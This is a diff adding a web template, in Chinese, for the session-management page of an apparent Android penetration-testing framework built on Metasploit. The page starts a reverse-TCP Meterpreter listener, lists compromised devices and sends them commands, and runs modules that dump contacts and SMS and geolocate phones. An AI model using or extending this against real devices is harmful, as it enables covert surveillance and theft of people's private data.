@@ -1,0 +1,532 @@
+{% extends "base.html" %}
+
+{% block title %}会话管理 - Android自动化渗透测试框架{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-12">
+        <h1><i class="fas fa-terminal"></i> 会话管理</h1>
+        <p class="text-muted">管理Meterpreter会话和执行命令</p>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fas fa-broadcast-tower"></i> 监听器状态</h5>
+            </div>
+            <div class="card-body">
+                <div id="listenerStatus">
+                    <p class="text-muted text-center">加载中...</p>
+                </div>
+                <!-- 添加MSFRPC状态提示 -->
+                <div id="msfrpcStatus" class="alert alert-warning mt-2" style="display: none;">
+                    <h6><i class="fas fa-exclamation-triangle"></i> MSF RPC服务未运行</h6>
+                    <p class="mb-1">部分高级功能（命令执行、会话管理）需要MSF RPC服务</p>
+                    <button class="btn btn-sm btn-outline-primary" onclick="showMsfrpcHelp()">
+                        查看启动说明
+                     </button>
+                </div>
+                <div class="mt-3">
+                    <button class="btn btn-primary btn-sm" onclick="startListener()">
+                        <i class="fas fa-play"></i> 启动监听器
+                    </button>
+                    <button class="btn btn-danger btn-sm" onclick="stopListener()">
+                        <i class="fas fa-stop"></i> 停止监听器
+                    </button>
+                </div>
+                <!-- 在监听器状态卡片中添加调试按钮 -->
+                <div class="mt-2">
+                    <button class="btn btn-outline-info btn-sm" onclick="debugSessions()">
+                        <i class="fas fa-bug"></i> 调试会话
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 改进会话列表显示，添加更多状态信息 -->
+        <div class="card mt-4">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h5 class="mb-0"><i class="fas fa-list"></i> 活跃会话</h5>
+                <div>
+                    <span class="badge bg-primary" id="sessionsCount">0</span>
+                    <button class="btn btn-sm btn-outline-secondary" onclick="loadSessions()">
+                        <i class="fas fa-sync-alt"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="card-body">
+                <div id="sessionsList">
+                    <div class="text-center text-muted">
+                        <i class="fas fa-inbox fa-3x mb-3"></i>
+                        <p>加载会话列表...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card mt-4">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fas fa-lightbulb"></i> 常用命令</h5>
+            </div>
+            <div class="card-body">
+                <div id="commonCommands">
+                    <p class="text-muted text-center">加载中...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fas fa-terminal"></i> 命令执行</h5>
+            </div>
+            <div class="card-body">
+                <form id="commandForm">
+                    <div class="mb-3">
+                        <label for="sessionSelect" class="form-label">选择会话</label>
+                        <select class="form-select" id="sessionSelect" required>
+                            <option value="">-- 选择会话 --</option>
+                        </select>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="commandInput" class="form-label">命令</label>
+                        <input type="text" class="form-control" id="commandInput" 
+                               placeholder="输入要执行的命令..." required>
+                    </div>
+                    
+                    <div class="d-grid">
+                        <button type="submit" class="btn btn-success">
+                            <i class="fas fa-play"></i> 执行命令
+                        </button>
+                    </div>
+                </form>
+
+                <div class="mt-4">
+                    <h6>命令输出</h6>
+                    <div id="commandOutput" class="bg-dark text-light p-3 rounded" 
+                         style="height: 300px; overflow-y: auto; font-family: monospace;">
+                        <div class="text-muted">等待命令执行...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card mt-4">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fas fa-cubes"></i> Meterpreter模块</h5>
+            </div>
+            <div class="card-body">
+                <form id="moduleForm">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="moduleSessionSelect" class="form-label">选择会话</label>
+                                <select class="form-select" id="moduleSessionSelect" required>
+                                    <option value="">-- 选择会话 --</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="moduleSelect" class="form-label">选择模块</label>
+                                <select class="form-select" id="moduleSelect" required>
+                                    <option value="">-- 选择模块 --</option>
+                                    <option value="post/multi/gather/android_info">android_info - 收集Android信息</option>
+                                    <option value="post/multi/gather/dump_contacts">dump_contacts - 导出联系人</option>
+                                    <option value="post/multi/gather/dump_sms">dump_sms - 导出短信</option>
+                                    <option value="post/multi/gather/geolocate">geolocate - 获取地理位置</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="d-grid">
+                        <button type="submit" class="btn btn-warning">
+                            <i class="fas fa-cube"></i> 运行模块
+                        </button>
+                    </div>
+                </form>
+
+                <div class="mt-4">
+                    <h6>模块输出</h6>
+                    <div id="moduleOutput" class="bg-dark text-light p-3 rounded" 
+                         style="height: 200px; overflow-y: auto; font-family: monospace;">
+                        <div class="text-muted">等待模块执行...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+let sessionsRefreshInterval;
+
+// 页面加载时初始化
+document.addEventListener('DOMContentLoaded', function() {
+    loadListenerStatus();
+    loadSessions();
+    loadCommonCommands();
+    
+    // 每3秒刷新会话列表
+    sessionsRefreshInterval = setInterval(loadSessions, 3000);
+});
+
+// 页面卸载时清理
+window.addEventListener('beforeunload', function() {
+    if (sessionsRefreshInterval) {
+        clearInterval(sessionsRefreshInterval);
+    }
+});
+
+function loadListenerStatus() {
+    fetch('/api/listener/status')
+        .then(response => response.json())
+        .then(data => {
+            const statusDiv = document.getElementById('listenerStatus');
+            
+            if (data.running) {
+                statusDiv.innerHTML = `
+                    <div class="alert alert-success">
+                        <h6><i class="fas fa-check-circle"></i> 监听器运行中</h6>
+                        <p class="mb-1">地址: ${data.lhost}:${data.lport}</p>
+                        <p class="mb-1">会话数: ${data.sessions_count}</p>
+                        <p class="mb-0">MSF RPC: ${data.msfrpc_available ? '可用' : '不可用'}</p>
+                    </div>
+                `;
+
+                // 显示MSFRPC状态提示
+                if (!data.msfrpc_available) {
+                    document.getElementById('msfrpcStatus').style.display = 'block';
+                } else {
+                    document.getElementById('msfrpcStatus').style.display = 'none';
+                }
+            } else {
+                statusDiv.innerHTML = `
+                    <div class="alert alert-danger">
+                        <h6><i class="fas fa-times-circle"></i> 监听器未运行</h6>
+                        <p class="mb-0">请先启动监听器</p>
+                    </div>
+                `;
+            }
+        })
+        .catch(error => {
+            console.error('获取监听器状态失败:', error);
+        });
+}
+
+function loadSessions() {
+    fetch('/api/sessions/list')
+        .then(response => response.json())
+        .then(data => {
+            console.log("会话数据:", data); // 调试信息
+            
+            const sessionsDiv = document.getElementById('sessionsList');
+            const sessionSelect = document.getElementById('sessionSelect');
+            const moduleSessionSelect = document.getElementById('moduleSessionSelect');
+            const sessionsCount = document.getElementById('sessionsCount');
+            
+            if (data.success && data.count > 0) {
+                // 更新会话计数
+                sessionsCount.textContent = data.count;
+                
+                let sessionsHtml = '<div class="list-group">';
+                
+                sessionSelect.innerHTML = '<option value="">-- 选择会话 --</option>';
+                moduleSessionSelect.innerHTML = '<option value="">-- 选择会话 --</option>';
+                
+                Object.values(data.sessions).forEach(session => {
+                    const timeAgo = Math.round((Date.now() / 1000 - session.timestamp) / 60);
+                    const lastActivity = Math.round((Date.now() / 1000 - session.last_activity) / 60);
+                    
+                    // 会话状态指示器
+                    let statusBadge = '<span class="badge bg-success">活跃</span>';
+                    if (!session.verified) {
+                        statusBadge = '<span class="badge bg-warning">未验证</span>';
+                    }
+                    
+                    sessionsHtml += `
+                    <div class="list-group-item">
+                        <div class="d-flex w-100 justify-content-between">
+                            <h6 class="mb-1">会话 ${session.id}</h6>
+                            ${statusBadge}
+                        </div>
+                        <p class="mb-1">类型: ${session.type}</p>
+                        <p class="mb-1">目标: ${session.target_host}</p>
+                        <p class="mb-1">用户: ${session.username}</p>
+                        <small class="text-muted">
+                            建立: ${timeAgo}分钟前 | 
+                            最后活动: ${lastActivity}分钟前
+                        </small>
+                        ${session.verified ? '<small class="text-success">✓ 已验证</small>' : '<small class="text-warning">⚠ 未验证</small>'}
+                    </div>
+                    `;
+                    
+                    // 添加到选择框
+                    const option = `<option value="${session.id}">会话 ${session.id} - ${session.target_host}</option>`;
+                    sessionSelect.innerHTML += option;
+                    moduleSessionSelect.innerHTML += option;
+                });
+                
+                sessionsHtml += '</div>';
+                sessionsDiv.innerHTML = sessionsHtml;
+            } else {
+                // 更新会话计数
+                sessionsCount.textContent = '0';
+                
+                sessionsDiv.innerHTML = `
+                    <div class="text-center text-muted">
+                        <i class="fas fa-inbox fa-3x mb-3"></i>
+                        <p>暂无活跃会话</p>
+                        <small>当有Meterpreter会话建立时，这里会显示会话信息</small>
+                    </div>
+                `;
+                sessionSelect.innerHTML = '<option value="">-- 选择会话 --</option>';
+                moduleSessionSelect.innerHTML = '<option value="">-- 选择会话 --</option>';
+            }
+        })
+        .catch(error => {
+            console.error('获取会话列表失败:', error);
+            document.getElementById('sessionsList').innerHTML = `
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-triangle"></i> 获取会话列表失败: ${error}
+                </div>
+            `;
+        });
+}
+
+function loadCommonCommands() {
+    fetch('/api/commands/common')
+        .then(response => response.json())
+        .then(data => {
+            const commandsDiv = document.getElementById('commonCommands');
+            
+            if (data.success) {
+                let commandsHtml = '';
+                
+                Object.entries(data.commands).forEach(([category, info]) => {
+                    commandsHtml += `
+                    <div class="mb-3">
+                        <h6>${info.name}</h6>
+                        <div class="d-flex flex-wrap gap-1">
+                    `;
+                    
+                    info.commands.forEach(cmd => {
+                        commandsHtml += `<span class="badge bg-secondary cmd-badge" onclick="setCommand('${cmd}')">${cmd}</span>`;
+                    });
+                    
+                    commandsHtml += `
+                        </div>
+                    </div>
+                    `;
+                });
+                
+                commandsDiv.innerHTML = commandsHtml;
+            } else {
+                commandsDiv.innerHTML = '<p class="text-muted text-center">加载命令失败</p>';
+            }
+        })
+        .catch(error => {
+            console.error('获取常用命令失败:', error);
+        });
+}
+
+function setCommand(command) {
+    document.getElementById('commandInput').value = command;
+}
+
+// 命令执行表单
+document.getElementById('commandForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const sessionId = document.getElementById('sessionSelect').value;
+    const command = document.getElementById('commandInput').value;
+    
+    if (!sessionId || !command) {
+        alert('请选择会话并输入命令');
+        return;
+    }
+    
+    executeCommand(sessionId, command);
+});
+
+// 模块执行表单
+document.getElementById('moduleForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const sessionId = document.getElementById('moduleSessionSelect').value;
+    const moduleName = document.getElementById('moduleSelect').value;
+    
+    if (!sessionId || !moduleName) {
+        alert('请选择会话和模块');
+        return;
+    }
+    
+    runModule(sessionId, moduleName);
+});
+
+function executeCommand(sessionId, command) {
+    const outputDiv = document.getElementById('commandOutput');
+    
+    // 显示执行中状态
+    outputDiv.innerHTML = `<div class="text-warning">执行中: ${command}...</div>`;
+    
+    fetch(`/api/sessions/${sessionId}/command`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({command: command})
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            outputDiv.innerHTML = `
+                <div class="text-success">命令执行成功:</div>
+                <pre class="text-light mt-2">${data.output || '无输出'}</pre>
+                <div class="text-muted mt-2">会话: ${data.session_id} | 时间: ${new Date().toLocaleString()}</div>
+            `;
+        } else {
+            outputDiv.innerHTML = `<div class="text-danger">执行失败: ${data.error}</div>`;
+        }
+    })
+    .catch(error => {
+        outputDiv.innerHTML = `<div class="text-danger">请求失败: ${error}</div>`;
+    });
+}
+
+function runModule(sessionId, moduleName) {
+    const outputDiv = document.getElementById('moduleOutput');
+    
+    // 显示执行中状态
+    outputDiv.innerHTML = `<div class="text-warning">运行模块: ${moduleName}...</div>`;
+    
+    fetch(`/api/sessions/${sessionId}/module`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            module_name: moduleName,
+            options: {}
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            outputDiv.innerHTML = `
+                <div class="text-success">模块执行成功:</div>
+                <pre class="text-light mt-2">${JSON.stringify(data.result, null, 2) || '无输出'}</pre>
+                <div class="text-muted mt-2">会话: ${data.session_id} | 时间: ${new Date().toLocaleString()}</div>
+            `;
+        } else {
+            outputDiv.innerHTML = `<div class="text-danger">执行失败: ${data.error}</div>`;
+        }
+    })
+    .catch(error => {
+        outputDiv.innerHTML = `<div class="text-danger">请求失败: ${error}</div>`;
+    });
+}
+
+function startListener() {
+    fetch('/api/listener/start', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            lhost: '0.0.0.0',
+            lport: 4444,
+            payload_type: 'android/meterpreter/reverse_tcp'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('监听器启动成功');
+            loadListenerStatus();
+        } else {
+            alert('启动失败: ' + data.error);
+        }
+    });
+}
+
+function stopListener() {
+    if (confirm('确定要停止监听器吗？所有会话将会断开。')) {
+        fetch('/api/listener/stop', {method: 'POST'})
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message);
+                loadListenerStatus();
+                loadSessions();
+            });
+    }
+}
+
+function debugSessions() {
+    fetch('/api/sessions/debug')
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                console.log("会话调试信息:", data.debug_info);
+                alert(`会话调试信息已输出到控制台\n框架会话数: ${data.debug_info.sessions_count}\nMSFRPC会话数: ${data.debug_info.msfrpc_sessions_count || 'N/A'}`);
+            } else {
+                alert('调试失败: ' + data.error);
+            }
+        });
+}
+
+function showMsfrpcHelp() {
+    alert('MSF RPC服务启动说明：\n\n' +
+          '1. 在终端中启动MSF RPC服务：\n' +
+          '   msfrpcd -P kali -S -f -a 127.0.0.1 -p 55553\n\n' +
+          '2. 参数说明：\n' +
+          '   -P kali : 设置密码为 kali\n' +
+          '   -S      : 禁用SSL\n' +
+          '   -f      : 前台运行\n' +
+          '   -a 127.0.0.1 : 绑定到本地地址\n' +
+          '   -p 55553 : 使用端口55553\n\n' +
+          '3. 或者使用系统服务启动：\n' +
+          '   sudo systemctl start msfrpcd');
+}
+</script>
+
+<style>
+.cmd-badge {
+    cursor: pointer;
+    transition: all 0.2s;
+}
+
+.cmd-badge:hover {
+    transform: scale(1.05);
+    background-color: #6c757d !important;
+}
+
+.list-group-item {
+    transition: all 0.2s;
+}
+
+.list-group-item:hover {
+    background-color: #f8f9fa;
+    transform: translateY(-1px);
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.badge {
+    font-size: 0.7em;
+}
+
+.text-success {
+    color: #198754 !important;
+}
+
+.text-warning {
+    color: #ffc107 !important;
+}
+
+.card-header {
+    background-color: #f8f9fa;
+    border-bottom: 1px solid #dee2e6;
+}
+</style>
+{% endblock %}
